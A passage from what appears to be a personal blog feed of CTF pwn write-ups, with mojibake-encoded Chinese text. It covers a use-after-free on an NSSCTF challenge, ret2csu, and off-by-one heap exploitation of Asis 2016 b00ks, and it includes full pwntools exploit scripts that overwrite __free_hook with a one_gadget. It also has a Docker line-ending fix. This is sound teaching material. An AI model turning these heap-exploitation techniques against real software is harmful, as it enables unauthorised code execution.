src="/2024/09/21/nssctf-girfriend/girlfriend_6.png"></p><p>è¾“å‡ºgirlfriend_name</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>åœ¨deleteä¸­çœ‹åˆ°åªfreeè€Œæ²¡æœ‰å°†æŒ‡é’ˆç½®NULLç»å…¸çš„UAFï¼Œå…ˆmalloc(0x10)ä¸¤ä¸ªï¼Œæ­¤æ—¶chunkå¦‚addå‡½æ•°è§£é‡Šçš„å›¾æ‰€ç¤ºã€‚å†freeæ‰ä»–ä»¬ï¼Œæ­¤æ—¶fastbinå¦‚ä¸‹</p><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_7.png"></p><p>æ­¤æ—¶å†malloc(0x20)ä¼šå°†girlfriend2_chunkç”¨æ‰ï¼Œç”±äºmalloc(0x20)æ‰€ä»¥è¿™æ®µç©ºé—´ä¼šåœ¨heapé‡Œé¢ï¼Œè€Œä¸æ˜¯ä»fastbinä¸­æ‹¿ï¼Œæ­¤æ—¶å†malloc(0x10)ï¼Œgirlfriend4_chunkä¼šç”¨æ‰2_nameåŒæ—¶4_nameä¼šç”¨æ‰girlfriend1_chunké‚£æ­¤æ—¶å°±å¯ä»¥å°†print_girlfriend1_nameåœ°å€æ¢æˆbackdoorã€‚å†show(0)ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28690</span>)</span><br><span class="line"><span class="comment">#io = process('./girlfriend')</span></span><br><span class="line">elf = ELF(<span class="string">'./girlfriend'</span>)</span><br><span class="line">backdoor = elf.symbols[<span class="string">'backdoor'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'size is :'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b'name is :'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'Index :'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'Index :'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'4'</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'mg1'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'mg2'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'mg3'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/19/docker-sh%E8%84%9A%E6%9C%AC1/"/>
      <url>/2024/09/19/docker-sh%E8%84%9A%E6%9C%AC1/</url>
      
        <content type="html"><![CDATA[<p>è„šæœ¬ä» Windows ä¼ è¾“åˆ° Linuxå¯¼è‡´è„šæœ¬æ— æ³•æ‰§è¡Œã€‚<span id="more"></span></p><p>åœ¨é…ç½®webåŠ¨æ€flagçš„æ—¶å€™å‘ç°ä¸€ä¸ªé—®é¢˜ï¼šflag.shæ— æ³•æ‰§è¡Œåœ¨ç»è¿‡é•¿æ—¶é—´çš„è¯•é”™ä¹‹åå‘ç°</p><p>å¦‚æœè„šæœ¬ä» Windows ä¼ è¾“åˆ° Linuxï¼Œå¯èƒ½åŒ…å« Windows æ ¼å¼çš„æ¢è¡Œç¬¦ï¼ˆ<code>\r\n</code>ï¼‰ï¼Œè¿™ä¼šå¯¼è‡´è„šæœ¬æ— æ³•æ‰§è¡Œã€‚</p><p>è§£å†³æ–¹æ³•ï¼š</p><p>ç”¨ä¸‹æ–¹è¯­å¥æ£€æŸ¥å¦‚æœçœ‹åˆ° <code>^M</code> å­—ç¬¦ï¼Œè¯´æ˜æ–‡ä»¶æ˜¯ Windows æ ¼å¼</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -v flag.sh</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/09/19/docker-sh%E8%84%9A%E6%9C%AC1/Blogs\docker-sh1.png"></p><p>å†ç”¨</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix flag.sh</span><br></pre></td></tr></tbody></table></figure><p>å°†å…¶è½¬æ¢ä¸º Unix æ ¼å¼</p><p>é‚£ä¹ˆæ ¹æ®æ­¤åŸç†Dockerfileæ›´æ”¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM base_image_nginx_mysql_php_56</span><br><span class="line"></span><br><span class="line">COPY src /var/www/html</span><br><span class="line"></span><br><span class="line">RUN mv /var/www/html/flag.sh / &amp;&amp; \</span><br><span class="line">    chmod +x /flag.sh</span><br><span class="line">RUN dos2unix /flag.sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/09/19/docker-sh%E8%84%9A%E6%9C%AC1/Blogs\docker-sh2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-wp-0904</title>
      <link href="/2024/09/04/NSSCTF-wp-0904/"/>
      <url>/2024/09/04/NSSCTF-wp-0904/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF-wp-0904<span id="more"></span></p><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_1.png"></p><p>64ä½ç¨‹åºï¼Œå¼€å¯äº†NX</p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_2.png"></p><p>åªæœ‰ä¸€ä¸ªå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†ä¸å­˜åœ¨å…¶ä»–å¯åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰åé—¨å‡½æ•°ã€‚</p><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_4.png"></p><p>ç­æœ‰è¶³å¤Ÿçš„gadgetså»æ³„éœ²libcåŸºå€</p><p>æƒ³åˆ°å¯ä»¥åˆ©ç”¨ret2scuæ„é€ gadgetsåŠ«æŒç¨‹åºæµ</p><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_3.png"></p><p>ä»0x4012AAåˆ°0x4012B2å¯ä»¥é€šè¿‡æ ˆæ§åˆ¶rbx,rbp,r12,r13,r14,r15çš„å€¼ï¼Œä»0x401290åˆ°0x401296å¯ä»¥é€šè¿‡r14,r13,r12dï¼ˆr12çš„ä½32ä½ï¼‰åˆ†åˆ«æ§åˆ¶rdx,rsi,ediï¼ˆrdiçš„ä½32ä½ï¼‰è€Œrdx,rsi,rdiæ­£æ˜¯x64ä½ç³»ç»Ÿçš„å¯„å­˜å™¨è°ƒç”¨çš„å‰ä¸‰ä¸ªï¼Œå†æ§åˆ¶r15ä¸ºç›®æ ‡å‡½æ•°çš„åœ°å€ï¼Œrbxä¸º0åˆ™å¯ä»¥è°ƒç”¨ç›®æ ‡å‡½æ•°ï¼Œæ§åˆ¶rbx + 1 == rbpåˆ™ä¸ä¼šè°ƒç”¨loc_401290è¿™é‡Œå¯ä»¥ç®€å•åœ°è®¾ç½®rbx = 0ï¼Œrbp = 1ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap_practice</title>
      <link href="/2024/07/28/heap-practice/"/>
      <url>/2024/07/28/heap-practice/</url>
      
        <content type="html"><![CDATA[<p>heap_practice<span id="more"></span></p><h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h1><h2 id="Asis-2016-b00ks"><a href="#Asis-2016-b00ks" class="headerlink" title="Asis_2016_b00ks"></a>Asis_2016_b00ks</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2024/07/28/heap-practice/b00ks_1.png" style="zoom:80%;">  64ä½ï¼Œé™¤äº†canaryå…¶ä»–ä¿æŠ¤å…¨å¼€<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><h4 id="mainå‡½æ•°"><a href="#mainå‡½æ•°" class="headerlink" title="mainå‡½æ•°"></a>mainå‡½æ•°</h4><p>æ˜¯ä¸€ä¸ªmenu<br><img src="/2024/07/28/heap-practice/b00ks_2.png" style="zoom:80%;">      </p><h4 id="createå‡½æ•°"><a href="#createå‡½æ•°" class="headerlink" title="createå‡½æ•°"></a>createå‡½æ•°</h4><p><img src="/2024/07/28/heap-practice/b00ks_3.png"><br>ä¸Šå›¾æ˜¯åˆ›å»ºä¸€ä¸ªbookçš„è¿‡ç¨‹åˆ†æå¯å¾—æœ‰ä¸‰ä¸ªchunkå’Œä¸€ä¸ªstructï¼Œä¸‰ä¸ªchunkåˆ†åˆ«æ˜¯book_name,description,book_ctrlã€‚structæ˜¯ä¹¦çš„ç»“æ„åŒ…å«book_id,name_ptr,descrption_ptr,description_size  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> book_id;</span><br><span class="line">    <span class="type">char</span>* name_ptr;</span><br><span class="line">    <span class="type">char</span>* description_ptr;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/07/28/heap-practice/b00ks_4.png"><br>ä¸‰ä¸ªchunkçš„ç»“æ„å¦‚ä¸‹<img src="/2024/07/28/heap-practice/b00ks_5.png" style="zoom:80%;"> </p><h4 id="deleteå‡½æ•°"><a href="#deleteå‡½æ•°" class="headerlink" title="deleteå‡½æ•°"></a>deleteå‡½æ•°</h4><img src="/2024/07/28/heap-practice/b00ks_6.png" style="zoom:80%;">    ä¸»è¦æ˜¯freeä¸‰ä¸ªchunk<h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p><img src="/2024/07/28/heap-practice/b00ks_7.png"><br>ç¨‹åºè‡ªå·±å®ç°äº†ä¸€ä¸ªreadå‡½æ•°ï¼Œä½†æ˜¯å…¶ä¸­å­˜åœ¨off_by_oneæ¼æ´<br>å‡½æ•°ä¸­  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ptr = <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure><p>ä¼šå°†æœ€åä¸€ä¸ªâ€™\x0aâ€™æ›¿æ¢ä¸ºâ€™\x00â€™</p><p><img src="/2024/07/28/heap-practice/b00ks_8.png">  </p><p>å¯ä»¥çœ‹åˆ°author_nameæŒ‡å‘bssæ®µçš„0x20é•¿åº¦çš„ä½ç½®ï¼Œåç§»ä¸º0x202040<del>0x20205Fã€‚ç´§æ¥ç€æ˜¯book_order_arryæŒ‡å‘çš„æ˜¯0x202060</del>0x2020FFå‚¨å­˜çš„æ˜¯bookçš„æŒ‡é’ˆã€‚</p><p><img src="/2024/07/28/heap-practice/b00ks_9.png"><br><img src="/2024/07/28/heap-practice/b00ks_10.png"></p><p>å½“i == numberæ—¶ï¼Œ\x00ä¼šæ”¾åœ¨0x202060ï¼Œé‚£ä¹ˆbook_order_arryå†™å…¥bookçš„æŒ‡é’ˆæ—¶ä¼šå°†\x00è¦†å†™ï¼Œæ­¤æ—¶æ‰§è¡Œshowå‡½æ•°æ—¶ä¼šå°†book_ptrè¾“å‡ºã€‚<br><img src="/2024/07/28/heap-practice/b00ks_11.png"><br>ç¨‹åºæä¾›äº†è®¾ç½®author_nameçš„å‡½æ•°è¿™æ ·å¯ä»¥åˆ©ç”¨off_by_nullå°†\x00è¦†ç›–åˆ°book_order_arryçš„æŒ‡é’ˆçš„ä½å­—èŠ‚ï¼Œå³ä»0x0000555555603710åˆ°0x0000555555603700ï¼Œ</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>åˆ›å»º 2 ä¸ª bookï¼Œé€šè¿‡off_by_oneï¼Œä½¿å¾— book1_ctrl æŒ‡é’ˆæŒ‡å‘ book1_description ä¸­ï¼›ç„¶ååœ¨book1_description ä¸­ä¼ªé€ ä¸€ä¸ª fake_book1_ctrlï¼Œä½¿å¾—å…¶ä¸­çš„ book1_description_ptr æŒ‡å‘ book2_description_ptrï¼›é€šè¿‡å…ˆåä¿®æ”¹ book1_description å’Œ book2_descriptionï¼Œä»è€Œå®ç°ä»»æ„åœ°å€å†™ä»»æ„å†…å®¹çš„åŠŸèƒ½ã€‚book2 çš„ description çš„å¤§å°è¶Šå¤§è¶Šå¥½ ï¼Œè¿™æ ·ä¼šé€šè¿‡ mmap () å‡½æ•°å»åˆ†é…å †ç©ºé—´ï¼Œè€Œè¯¥å †åœ°å€ä¸ libc çš„åŸºå€ç›¸å…³ï¼Œè¿™æ ·é€šè¿‡æ³„éœ²è¯¥å †åœ°å€å¯ä»¥è®¡ç®—å‡º libc çš„åŸºå€ã€‚</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><img src="/2024/07/28/heap-practice/b00ks_12.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./b00ks'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./b00ks'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size,name,des_size,des</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"1"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"4"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">book_id=<span class="built_in">int</span>(io.readline()[:-<span class="number">1</span>])</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">book_name=io.readline()[:-<span class="number">1</span>]</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">book_des=io.readline()[:-<span class="number">1</span>]</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">book_author=io.readline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> book_id,book_name,book_des,book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createname</span>(<span class="params">name</span>):</span><br><span class="line">io.readuntil(<span class="string">b"name: "</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"5"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id,new_des</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"3"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.writeline(<span class="built_in">str</span>(book_id))</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"2"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line">createname(<span class="string">b"A"</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">32</span>,<span class="string">b"a"</span>,<span class="number">140</span>,<span class="string">b"a"</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>,<span class="string">b"a"</span>,<span class="number">0x21000</span>,<span class="string">b"b"</span>)</span><br><span class="line"></span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"book1_address:"</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x10</span> + p64(<span class="number">1</span>) + p64(book1_addr+<span class="number">0x38</span>) + p64(book1_addr+<span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1,payload)</span><br><span class="line">changename(<span class="string">b"A"</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr=u64(book_name.ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>))</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"book2 name addr:"</span>+<span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">"book2 des addr:"</span>+<span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x22010</span></span><br><span class="line">log.success(<span class="string">"libc base:"</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f322</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>,p64(free_hook)*<span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="2015-plaidctf-datastore"><a href="#2015-plaidctf-datastore" class="headerlink" title="2015_plaidctf_datastore"></a>2015_plaidctf_datastore</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/datastore_1.png"><br>64ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å¼€</p><h1 id="chunk-extend-shrink"><a href="#chunk-extend-shrink" class="headerlink" title="chunk-extend-shrink"></a>chunk-extend-shrink</h1><h2 id="hitcontraning-lab13"><a href="#hitcontraning-lab13" class="headerlink" title="hitcontraning_lab13"></a>hitcontraning_lab13</h2><h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/lab13_1.png"><br>64ä½æ“ä½œç³»ç»Ÿï¼Œå¼€å¯äº†canaryå’Œnx</p><h3 id="ida-1"><a href="#ida-1" class="headerlink" title="ida"></a>ida</h3><p>è‡ªå®šä¹‰çš„å †åˆ†é…å™¨ï¼Œæ¯ä¸ªå †ä¸»è¦æœ‰ä¸¤ä¸ªæˆå‘˜ï¼šå¤§å°ä¸å†…å®¹æŒ‡é’ˆ</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="/2024/07/28/heap-practice/lab13_2.png"><br>åœ¨è¿™ä¸ªå‡½æ•°ä¸­å¯¹contenté‡å†™æ—¶size + 1è¿™é‡Œå­˜åœ¨off_by_oneæ¼æ´</p><h3 id="åŠ¨è°ƒ"><a href="#åŠ¨è°ƒ" class="headerlink" title="åŠ¨è°ƒ"></a>åŠ¨è°ƒ</h3><p><img src="/2024/07/28/heap-practice/lab13_4.png"><br>ç»“æ„å¦‚ä¸Š<br><img src="/2024/07/28/heap-practice/lab13_3.png"><br>åˆ©ç”¨editçš„off_by_oneæ¼æ´å¯ä»¥å¯¹next_chunkè¿›è¡Œä¿®æ”¹ï¼Œè¾¾åˆ°heaparryå’ŒheapæŒ‡é’ˆçš„äº’æ¢</p><p>ä¿®æ”¹å‰<br><img src="/2024/07/28/heap-practice/lab13_5.png"> <img src="/2024/07/28/heap-practice/lab13_7.png" style="zoom:67%;"></p><p>ä¿®æ”¹å<br><img src="/2024/07/28/heap-practice/lab13_6.png"><img src="/2024/07/28/heap-practice/lab13_8.png" style="zoom:67%;"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span 